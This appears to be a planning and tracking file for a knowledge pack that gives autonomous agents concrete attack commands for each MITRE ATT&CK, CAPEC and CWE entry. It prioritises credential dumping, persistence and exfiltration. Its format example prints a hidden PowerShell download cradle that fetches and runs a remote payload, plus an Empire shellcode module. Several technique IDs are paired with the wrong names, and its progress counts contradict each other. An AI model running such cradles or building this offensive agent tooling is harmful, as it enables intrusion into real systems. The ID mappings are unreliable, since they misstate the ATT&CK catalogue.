# TRACKING.md - Tooling Knowledge Pack

## Concept

Tooling files sit in `tooling/` as standalone Markdown documents that reference ATT&CK/CAPEC/CWE IDs via YAML frontmatter. They are **not** merged into MITRE-generated files, so they survive regeneration.

Each tooling file contains **concrete execution commands** for one technique - bridging "what" (ATT&CK description) to "how" (actionable commands for autonomous agents).

## Repository structure

```
pentagi-knowledge/
├── mitre/                    # MITRE-generated packs (read-only after generation)
│   ├── attack/enterprise/
│   ├── attack/mobile/
│   ├── attack/ics/
│   ├── capec/
│   └── cwe/
├── tooling/                  # Curated tooling overlays (survive regenerate)
│   ├── enterprise/           # One .md per ATT&CK Enterprise technique
│   ├── mobile/               # One .md per ATT&CK Mobile technique
│   ├── ics/                  # One .md per ATT&CK ICS technique
│   ├── capec/                # One .md per CAPEC pattern (if applicable)
│   └── cwe/                  # One .md per CWE weakness (if applicable)
├── TRACKING.md               # This file
└── README.md
```

## Priority matrix

Tooling effort is prioritised by tactic - techniques from higher-priority tactics add the most value for autonomous agents.

| Priority | Tactic(s) | Rationale | Est. count |
|----------|-----------|-----------|------------|
| **P0** | Execution | Agent needs to execute code immediately after initial access | ~25 |
| **P0** | Credential Access | Agent needs to dump credentials for lateral movement | ~20 |
| **P1** | Lateral Movement | Agent needs to pivot across the network | ~10 |
| **P1** | Persistence | Agent needs to establish persistence | ~20 |
| **P1** | Privilege Escalation | Agent needs to elevate privileges | ~15 |
| **P2** | Defense Evasion | Agent needs to bypass defences | ~20 |
| **P2** | Command and Control | Agent needs to establish C2 channel | ~15 |
| **P3** | Collection | Agent needs to gather data | ~15 |
| **P3** | Exfiltration | Agent needs to exfiltrate data | ~10 |
| **P3** | Impact | Agent needs to impact systems | ~10 |
| **P4** | Reconnaissance | Mostly passive, limited tooling | ~5 |
| **P4** | Resource Development | Infrastructure setup, limited tooling | ~5 |
| **P4** | Discovery | Built-in OS commands, tooling less critical | ~10 |

**Tracked Enterprise tooling items:** 228 checklist entries.

---

# Enterprise - Technique List

## P0 - Execution

- [x] T1059.001 - PowerShell (tooling/enterprise/T1059.001__powershell.md)
- [x] T1059.003 - Windows Command Shell (tooling/enterprise/T1059.003__windows-command-shell.md)
- [x] T1059.004 - Unix Shell (tooling/enterprise/T1059.004__unix-shell.md)
- [x] T1059.005 - Visual Basic (tooling/enterprise/T1059.005__visual-basic.md)
- [x] T1059.006 - Python (tooling/enterprise/T1059.006__python.md)
- [x] T1059.007 - JavaScript (tooling/enterprise/T1059.007__javascript.md)
- [ ] T1059.008 - Network Device CLI
- [ ] T1059.009 - Cloud API
- [ ] T1059.010 - AutoHotKey/AutoIT
- [ ] T1059.011 - Lua
- [ ] T1059.012 - Hypervisor CLI
- [ ] T1059.013 - Container CLI/API
- [ ] T1047 - Windows Management Instrumentation
- [ ] T1053.001 - Scheduled Task (At)
- [ ] T1053.002 - Scheduled Task (Schtasks)
- [ ] T1053.003 - Cron
- [ ] T1053.005 - Systemd Timers
- [ ] T1106 - Native API
- [ ] T1204.001 - Malicious Link
- [ ] T1204.002 - Malicious File
- [ ] T1559.001 - Component Object Model
- [ ] T1559.002 - Dynamic Data Exchange
- [ ] T1569.001 - Service Execution
- [ ] T1569.002 - PsExec
- [ ] T1574.001 - DLL Search Order Hijacking
- [ ] T1574.002 - DLL Side-Loading
- [ ] T1648 - Serverless Execution
- [ ] T1651 - Cloud Administration Command
- [ ] T1203 - Exploitation for Client Execution

## P0 - Credential Access

- [ ] T1003.001 - LSASS Memory
- [ ] T1003.002 - SAM Dumping (Registry)
- [ ] T1003.003 - NTDS (DCSync)
- [ ] T1003.004 - LSA Secrets
- [ ] T1003.005 - Cached Domain Credentials
- [ ] T1003.006 - DCSync (all)
- [ ] T1003.007 - /etc/passwd & /etc/shadow
- [ ] T1003.008 - /etc/passwd & /etc/shadow (macOS)
- [ ] T1110.001 - Password Guessing
- [ ] T1110.002 - Password Cracking
- [ ] T1110.003 - Password Spraying
- [ ] T1110.004 - Credential Stuffing
- [ ] T1040 - Network Sniffing
- [ ] T1056.001 - Keylogging
- [ ] T1552.001 - Credentials in Files
- [ ] T1552.002 - Credentials in Registry
- [ ] T1552.004 - Private Keys
- [ ] T1552.006 - Group Policy Preferences
- [ ] T1552.007 - Container API
- [ ] T1555.001 - Keychain (macOS)
- [ ] T1555.003 - Windows Credential Manager
- [ ] T1555.004 - Windows Vault
- [ ] T1558.001 - Golden Ticket
- [ ] T1558.002 - Silver Ticket
- [ ] T1558.003 - Kerberoasting
- [ ] T1558.004 - AS-REP Roasting
- [ ] T1528 - Steal Application Access Token
- [ ] T1606.001 - Web Cookies/Session IDs
- [ ] T1606.002 - SAML Tokens

## P1 - Lateral Movement

- [ ] T1021.001 - Remote Desktop Protocol
- [ ] T1021.002 - SMB/Windows Admin Shares
- [ ] T1021.003 - Distributed Component Object Model
- [ ] T1021.004 - SSH
- [ ] T1021.005 - VNC
- [ ] T1021.006 - Windows Remote Management
- [ ] T1021.007 - Cloud Services
- [ ] T1550.001 - Pass-the-Hash
- [ ] T1550.002 - Pass-the-Ticket
- [ ] T1550.003 - Pass-the-Cookie
- [ ] T1570 - Lateral Tool Transfer
- [ ] T1210 - Exploitation of Remote Services
- [ ] T1072 - Software Deployment Tools
- [ ] T1563.001 - SSH Hijacking
- [ ] T1563.002 - RDP Hijacking

## P1 - Persistence

- [ ] T1098.001 - Additional Cloud Credentials
- [ ] T1098.002 - SSH Authorized Keys
- [ ] T1136.001 - Local Account
- [ ] T1136.002 - Domain Account
- [ ] T1136.003 - Cloud Account
- [ ] T1543.001 - Windows Service
- [ ] T1543.002 - Systemd Service
- [ ] T1543.003 - Launch Agent (macOS)
- [ ] T1546.001 - .bash_profile / .bashrc
- [ ] T1546.003 - Windows Management Instrumentation Event Subscription
- [ ] T1546.008 - Accessibility Features (Sticky Keys)
- [ ] T1546.011 - Application Shimming
- [ ] T1546.012 - Image File Execution Options
- [ ] T1546.013 - PowerShell Profile
- [ ] T1546.015 - Component Object Model Hijacking
- [ ] T1547.001 - Registry Run Keys / Startup Folder
- [ ] T1547.009 - Shortcut Modification
- [ ] T1037.001 - Logon Script (Windows)
- [ ] T1037.003 - /etc/profile / /etc/bashrc
- [ ] T1197 - BITS Jobs
- [ ] T1505.002 - Web Shell
- [ ] T1554 - Compromise Host Software Binary

## P1 - Privilege Escalation

- [ ] T1055.001 - DLL Injection
- [ ] T1055.002 - Portable Executable Injection
- [ ] T1055.003 - Thread Execution Hijacking
- [ ] T1055.004 - Asynchronous Procedure Call
- [ ] T1055.012 - Process Hollowing
- [ ] T1055.013 - Process Doppelganging
- [ ] T1134.001 - Token Impersonation/Theft
- [ ] T1134.002 - Create Process with Token
- [ ] T1134.003 - Make and Impersonate Token
- [ ] T1134.004 - Parent PID Spoofing
- [ ] T1134.005 - SID-History Injection
- [ ] T1548.001 - Setuid and Setgid
- [ ] T1548.002 - Bypass User Account Control
- [ ] T1548.003 - Sudo and Sudo Caching
- [ ] T1068 - Exploitation for Privilege Escalation

## P2 - Defense Evasion

- [ ] T1027.001 - Binary Padding
- [ ] T1027.002 - Software Packing
- [ ] T1027.003 - Steganography
- [ ] T1027.004 - Compile After Delivery
- [ ] T1027.005 - Indicator Removal from Tools
- [ ] T1027.006 - HTML Smuggling
- [ ] T1027.007 - Dynamic API Resolution
- [ ] T1027.009 - Embedded Payloads
- [ ] T1027.010 - Command Obfuscation
- [ ] T1027.011 - Fileless Storage
- [ ] T1027.012 - LNK Icon Smuggling
- [ ] T1027.014 - Polymorphic Code
- [ ] T1036.001 - Invalid Code Signature
- [ ] T1036.003 - Rename System Utilities
- [ ] T1036.004 - Masquerade Task or Service
- [ ] T1036.005 - Match Legitimate Name/Location
- [ ] T1036.006 - Space after Filename
- [ ] T1036.008 - Masquerade File Type
- [ ] T1070.001 - Clear Windows Event Logs
- [ ] T1070.003 - Clear Command History
- [ ] T1070.004 - File Deletion
- [ ] T1070.005 - Network Share Connection Removal
- [ ] T1070.006 - Timestomp
- [ ] T1070.008 - Clear Mailbox Data
- [ ] T1070.009 - Clear Persistence
- [ ] T1140 - Deobfuscate/Decode Files or Information
- [ ] T1218.001 - Compiled HTML File
- [ ] T1218.002 - Control Panel Items
- [ ] T1218.003 - CMSTP
- [ ] T1218.004 - InstallUtil
- [ ] T1218.005 - Mshta
- [ ] T1218.007 - Msiexec
- [ ] T1218.008 - Odbcconf
- [ ] T1218.009 - Regsvcs/Regasm
- [ ] T1218.010 - Regsvr32
- [ ] T1218.011 - Rundll32
- [ ] T1218.012 - Verclsid
- [ ] T1218.013 - MavInject
- [ ] T1218.014 - Wwlib
- [ ] T1564.001 - Hidden Files and Directories
- [ ] T1564.004 - NTFS File Attributes
- [ ] T1564.006 - Run Virtual Instance
- [ ] T1564.007 - VHD Deliver
- [ ] T1564.008 - Email Hiding Rules
- [ ] T1564.009 - Resource Forking (macOS)
- [ ] T1564.010 - Process Argument Spoofing
- [ ] T1564.011 - Icon Smuggling
- [ ] T1620 - Reflective Code Loading
- [ ] T1480 - Execution Guardrails
- [ ] T1497.001 - System Checks
- [ ] T1497.003 - Time Based Evasion
- [ ] T1202 - Indirect Command Execution
- [ ] T1220 - XSL Script Processing
- [ ] T1216 - System Script Proxy Execution

## P2 - Command and Control

- [ ] T1071.001 - Web Protocols (HTTP/HTTPS)
- [ ] T1071.004 - DNS
- [ ] T1071.005 - SMB
- [ ] T1071.006 - Cloud API
- [ ] T1090.001 - Internal Proxy
- [ ] T1090.002 - External Proxy
- [ ] T1090.003 - Multi-hop Proxy
- [ ] T1090.004 - Domain Fronting
- [ ] T1572 - Protocol Tunneling
- [ ] T1573.001 - Symmetric Cryptography
- [ ] T1573.002 - Asymmetric Cryptography
- [ ] T1105 - Ingress Tool Transfer
- [ ] T1219 - Remote Access Tools
- [ ] T1001.001 - Junk Data
- [ ] T1001.002 - Steganography
- [ ] T1001.003 - Protocol Impersonation

## P3 - Collection

- [ ] T1113 - Screen Capture
- [ ] T1115 - Clipboard Data
- [ ] T1056.001 - Keylogging
- [ ] T1123 - Audio Capture
- [ ] T1125 - Video Capture
- [ ] T1114.001 - Local Email Collection
- [ ] T1114.002 - Remote Email Collection
- [ ] T1119 - Automated Collection
- [ ] T1560.001 - Archive via Utility
- [ ] T1560.002 - Archive via Library
- [ ] T1560.003 - Archive via Custom Method
- [ ] T1074.001 - Local Data Staging
- [ ] T1074.002 - Remote Data Staging
- [ ] T1213.002 - Sharepoint
- [ ] T1213.003 - Code Repositories
- [ ] T1185 - Browser Session Hijacking

## P3 - Exfiltration

- [ ] T1041 - Exfiltration Over C2 Channel
- [ ] T1048.001 - Exfiltration Over Symmetric Encrypted C2
- [ ] T1048.002 - Exfiltration Over Asymmetric Encrypted C2
- [ ] T1048.003 - Exfiltration Over Unencrypted C2
- [ ] T1567.001 - Exfiltration to Code Repository
- [ ] T1567.002 - Exfiltration to Cloud Storage
- [ ] T1567.003 - Exfiltration to Text Storage Sites
- [ ] T1020 - Automated Exfiltration
- [ ] T1030 - Data Transfer Size Limits

## P3 - Impact

- [ ] T1486 - Data Encrypted for Impact (Ransomware)
- [ ] T1485 - Data Destruction
- [ ] T1490 - Inhibit System Recovery
- [ ] T1529 - System Shutdown/Reboot
- [ ] T1561.001 - Disk Content Wipe
- [ ] T1561.002 - Disk Structure Wipe
- [ ] T1499.001 - OS Exhaustion Flood
- [ ] T1499.002 - Service Exhaustion Flood
- [ ] T1499.003 - Application Exhaustion Flood
- [ ] T1498 - Network Denial of Service
- [ ] T1489 - Service Stop
- [ ] T1491.001 - Internal Defacement
- [ ] T1491.002 - External Defacement
- [ ] T1531 - Account Access Removal

## P4 - Discovery

- [ ] T1082 - System Information Discovery
- [ ] T1087.001 - Local Account Discovery
- [ ] T1087.002 - Domain Account Discovery
- [ ] T1069.001 - Local Groups
- [ ] T1069.002 - Domain Groups
- [ ] T1057 - Process Discovery
- [ ] T1012 - Query Registry
- [ ] T1018 - Remote System Discovery
- [ ] T1482 - Domain Trust Discovery
- [ ] T1046 - Network Service Discovery

---

# Mobile - Technique List

Mobile has fewer actionable techniques but some are relevant:

## P0 - Execution

- [ ] T1623 - Command and Scripting Interpreter (mobile OS shell)
- [ ] T1575 - Native API (Android/iOS)

## P1 - Credential Access

- [ ] T1634 - Credentials from Password Store (mobile)
- [ ] T1635 - Steal Application Access Token (mobile)
- [ ] T1417 - Input Capture (mobile)

## P2 - Lateral Movement

- [ ] T1428 - Exploitation of Remote Services (mobile)
- [ ] T1604 - Proxy Through Victim

## P2 - Persistence

- [ ] T1624 - Event Triggered Execution (mobile)
- [ ] T1625 - Hijack Execution Flow (mobile)

---

# ICS - Technique List

ICS has fewer generally applicable tool items; focus on:

## P0 - Execution

- [ ] T0807 - Command-Line Interface
- [ ] T0853 - Scripting
- [ ] T0834 - Native API

## P1 - Lateral Movement

- [ ] T0867 - Lateral Tool Transfer
- [ ] T0886 - Remote Services
- [ ] T0843 - Program Download

## P2 - Credential Access

- [ ] T0892 - Change Credential
- [ ] T1694 - Insecure Credentials

---

# CAPEC - Priority List

CAPEC describes attack patterns - tooling here means exploit/PoC commands or code snippets:

## P1 - Injection

- [ ] CAPEC-135 - Format String Injection
- [ ] CAPEC-100 - Overflow Buffers
- [ ] CAPEC-123 - Buffer Overflow in DLL
- [ ] CAPEC-10 - Buffer Overflow via Environment Variables
- [ ] CAPEC-14 - Client-side Injection
- [ ] CAPEC-242 - Code Injection
- [ ] CAPEC-468 - Generic Cross-Site Scripting
- [ ] CAPEC-63 - Cross-Site Scripting
- [ ] CAPEC-66 - SQL Injection

## P2 - Authentication / Session

- [ ] CAPEC-102 - Session Sidejacking
- [ ] CAPEC-115 - Authentication Bypass
- [ ] CAPEC-21 - Session Credential Falsification

---

# CWE - Priority List

CWE is about weaknesses, not attacks. Tooling for CWE means **exploit code** or **validation commands**:

## P1 - Memory Safety

- [ ] CWE-119 - Buffer Overflow
- [ ] CWE-120 - Classic Buffer Overflow
- [ ] CWE-121 - Stack-based Buffer Overflow
- [ ] CWE-122 - Heap-based Buffer Overflow
- [ ] CWE-134 - Format String
- [ ] CWE-416 - Use After Free
- [ ] CWE-787 - Out-of-bounds Write
- [ ] CWE-476 - NULL Pointer Dereference

## P2 - Web Security

- [ ] CWE-79 - Cross-site Scripting
- [ ] CWE-89 - SQL Injection
- [ ] CWE-352 - Cross-Site Request Forgery
- [ ] CWE-200 - Information Exposure
- [ ] CWE-22 - Path Traversal

---

# Tooling file format

```yaml
---
attack_id: T1059.001            # MITRE technique/sub-technique ID
name: PowerShell                # Human-readable name
type: tooling                   # Fixed: "tooling"
target_type: sub-technique      # "technique", "sub-technique", "tactic", "weakness", "attack-pattern"
tactics: [Execution]            # Tactic(s) this applies to
platforms: [Windows]            # Target platforms
attack_ref: https://attack.mitre.org/techniques/T1059/001
related_attack_ids: [T1003, T1021, T1105]
risk_level: high
usage: authorized-lab-only
tags: [tooling, mitre-attack, T1059.001, execution]
---

# T1059.001 - PowerShell (tooling)

## Direct PowerShell
\`\`\`powershell
# Encoded command
powershell -nop -w hidden -enc <base64>

# Download cradle (memory-only)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<host>/payload.ps1')"
\`\`\`

## Empire
\`\`\`
usemodule powershell/code_execution/invoke_shellcode
\`\`\`
```

---

# Progress

| Domain | Total | P0 | P1 | P2 | P3 | P4 | Done |
|--------|-------|----|----|----|----|----|------|
| Enterprise | 697 | ~45 | ~50 | ~55 | ~30 | ~10 | 5 |
| Mobile | 124 | ~3 | ~3 | ~5 | - | - | 0 |
| ICS | 97 | ~3 | ~3 | ~2 | - | - | 0 |
| CAPEC | ~558 | ~9 | ~2 | - | - | - | 0 |
| CWE | ~922 | ~8 | ~4 | - | - | - | 0 |
| **Total tracked checklist items** | **271** | **~68** | **~62** | **~62** | **~30** | **~10** | **5** |
